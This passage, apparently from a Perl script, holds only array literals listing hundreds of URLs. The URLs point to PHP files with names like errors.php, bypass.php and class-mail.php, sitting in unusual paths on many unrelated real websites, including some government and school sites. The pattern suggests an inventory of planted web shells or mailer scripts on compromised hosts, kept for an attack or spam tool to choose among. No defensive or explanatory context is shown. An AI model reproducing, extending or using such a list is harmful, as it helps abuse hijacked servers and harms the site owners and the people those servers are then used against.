"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.allcam.org/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://sufbellman.dk/media/error.php"

);

my @random9  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
